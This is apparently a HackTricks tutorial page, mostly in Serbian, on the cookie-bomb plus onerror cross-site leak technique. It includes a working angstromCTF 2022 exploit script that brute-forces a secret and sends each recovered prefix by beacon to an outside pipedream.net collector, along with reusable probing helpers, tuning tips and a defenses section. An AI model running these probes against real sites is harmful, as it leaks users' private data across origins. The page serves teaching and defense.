# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Ova tehnika kombinuje:
- Cookie bombing: napuniti žrtvin pregledač sa mnogo/velikih cookies za target origin tako da naredni zahtevi pogode ograničenja servera/zahtjeva (veličina request header-a, veličina URL-a u redirects, itd.).
- Error-event oracle: probing a cross-origin endpoint with a <script> (or other subresource) and distinguishing states with onload vs onerror.

Osnovna ideja
- Pronađite ciljni endpoint čije se ponašanje razlikuje za dva stanja koja želite testirati (npr. search “hit” vs “miss”).
- Osigurajte da “hit” path izazove tešku redirect chain ili dugačak URL dok “miss” path ostane kratak. Inflate-ujte request header-e koristeći mnogo cookies tako da samo “hit” path natera server da zakaže sa HTTP error-om (npr. 431/414/400). Greška preokrene onerror event i postane oracle za XS-Search.

Kada ovo funkcioniše
- Možete naterati žrtvin browser da pošalje cookies cilju (npr. cookies su SameSite=None ili ih možete postaviti u first-party kontekstu preko popup window.open).
- Postoji funkcija u aplikaciji koju možete zloupotrebiti da postavite proizvoljne cookies (npr. “save preference” endpoints koji pretvaraju kontrolisane input names/values u Set-Cookie) ili da napravite post-auth redirects koji ubacuju attacker-controlled podatke u URL.
- Server reaguje različito u ta dva stanja i, sa napuhanim header-ima/URL-om, jedno stanje prelazi limit i vraća error response koji okida onerror.

Napomena o server greškama korišćenim kao oracle
- 431 Request Header Fields Too Large se često vraća kada cookies naduvaju request headers; 414 URI Too Long ili server-specific 400 mogu se vratiti za duge request target-e. Bilo koji od ovih rezultuje neuspešnim učitavanjem subresource-a i okida onerror. [MDN documents 431 and typical causes like excessive cookies.]()

Praktičan primer (angstromCTF 2022)
Sledeći script (iz javnog writeupa) zloupotrebljava funkciju koja omogućava napadaču da ubaci proizvoljne cookies, zatim učitava cross-origin search endpoint kao script. Kada je query tačan, server izvršava redirect koji, zajedno sa cookie bloat-om, prelazi server limits i vraća error status, pa script.onerror okida; u suprotnom se ništa ne dešava.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
Zašto popup (window.open)?
- Moderni browseri sve češće blokiraju third‑party cookies. Otvaranje top-level prozora ka targetu čini cookie-je first‑party pa će Set-Cookie odgovori sa targeta ostati, omogućavajući cookie-bomb korak čak i uz ograničenja third‑party cookie-ja.

2024–2025 napomene o dostupnosti cookie-ja
- Chromium-based browsers i dalje obično šalju third‑party cookies osim ako korisnik ili sajt ne opt-out-uje, ali Safari i Firefox po defaultu blokiraju većinu third‑party cookie-ja. Planirajte za oba slučaja: (1) koristite first‑party cookie planting flow (window.open + auto-submit ka cookie-setting endpointu) i zatim (2) probe-ujte sa subresource koji uspeva samo kada su ti cookie-ji poslati. Ako su third‑party cookie-ji blokirani, premestite probe u same-site kontekst (npr. pokrenite oracle u popup-u preko same-site gadgeta i exfiltrate boolean sa postMessage ili beacon na vaš server).

Generic probing helper
If you already have a way to set many cookies on the target origin (first-party), you can reuse this minimal oracle against any endpoint whose success/failure leads to different network outcomes (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Alternativni tag oracle (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Napredno: de Bruijn–based cookie packing (CTF-proven)
- Kada aplikacija dozvoli kontrolu velikih cookie vrednosti, možete efikasno pakovati pogađanja tako što ćete svakoj probe pridodati de Bruijn sekvencu. Ovo održava per‑probe overhead malim, istovremeno osiguravajući da je heavy branch dosledno teži samo za pravi prefiks. Primer generatora za |Σ| simbola dužine n (staje u cookie vrednost):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Ideja u praksi: postavite više cookies čije su vrednosti prefix + deBruijn(k,n). Samo kada je testirani prefix tačan server preuzme "teži" tok (npr. dodatni redirect koji reflektuje dugačak cookie ili URL), što, u kombinaciji sa cookie bloat-om, prelazi limite i okida onerror. Pogledajte javni solver sa LA CTF 2024 koji koristi ovaj pristup.

Tips to build the oracle
- Force the “positive” state to be heavier: chain an extra redirect only when the predicate is true, or make the redirect URL reflect unbounded user input so it grows with the guessed prefix.
- Inflate headers: repeat cookie bombing until a consistent error is observed on the “heavy” path. Serveri obično ograničavaju veličinu headers i zakažu ranije kada je prisutan veći broj cookies.
- Stabilize: pokrenite više paralelnih operacija postavljanja cookies i sondirajte više puta da biste izgladili šum iz tajminga i keširanja.
- Bust caches and avoid pooling artifacts: dodajte nasumičan `#fragment` ili `?r=` u probe URL-ove, i preferirajte različita imena prozora kada koristite window.open petlje.
- Alternate subresources: ako je `<script>` filtriran, probajte `<link rel=stylesheet>` ili `<img>`. The onload/onerror boolean is the oracle; sadržaj ne mora da se parsira.

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs i serveri nameću različite limite. Od oktobra 2025, Cloudflare dokumentuje 128 KB ukupno za request headers (i 16 KB za URL) na edge-u, pa će možda trebati više/većih cookies kada su ciljevi iza njega. Drugi stackovi (npr. Apache preko LimitRequestFieldSize) su često bliži ~8 KB po header liniji i greške će se pojaviti ranije. Podesite veličinu bomb-e u skladu s tim. [Cloudflare docs show the 128 KB header limit.]

Related XS-Search tricks
- URL length based oracles (no cookies needed) mogu se kombinovati ili koristiti umesto toga kada možete forsirati vrlo dug request target:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Defenses and hardening
- Make success/failure responses indistinguishable:
- Izbegavajte uslovne redirects ili velike razlike u veličini odgovora između stanja. Vratite isti status, isti content type i sličnu dužinu body-ja bez obzira na stanje.
- Block cross-site subresource probes:
- SameSite cookies: postavite osetljive cookies na SameSite=Lax ili Strict tako da subresource zahtevi poput <script src> ne nose te cookies; preferirajte Strict za auth tokene kad je moguće.
- Fetch Metadata: sprovedite Resource Isolation Policy da odbacite cross-site subresource zahteve (npr. ako Sec-Fetch-Site != same-origin/same-site).
- Cross-Origin-Resource-Policy (CORP): postavite CORP: same-origin (ili bar same-site) za endpoint-e koji nisu namenjeni da budu ubačeni kao cross-origin subresources.
- X-Content-Type-Options: nosniff i ispravan Content-Type na JSON/HTML endpoint-ima da biste izbegli load-as-script kvirkove.
- Reduce header/URL amplification:
- Ograničite broj/veličinu postavljenih cookies; sanitizujte funkcije koje pretvaraju proizvoljna form polja u Set-Cookie.
- Normalizujte ili skratite reflektovane podatke u redirect-ovima; izbegavajte ugradnju dugih stringova pod kontrolom napadača u Location URL-ove.
- Održavajte dosledne server limite i uniformno ponašanje pri greškama (izbegavajte posebne error stranice samo za jednu granu).

Notes
- Ova klasa napada se široko razmatra kao “Error Events” u kontekstu XS-Leaks. Cookie-bomb korak je samo zgodan način da se samo jedna grana gurne preko server limita, proizvodeći pouzdan boolean oracle.



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
{{#include ../../banners/hacktricks-training.md}}
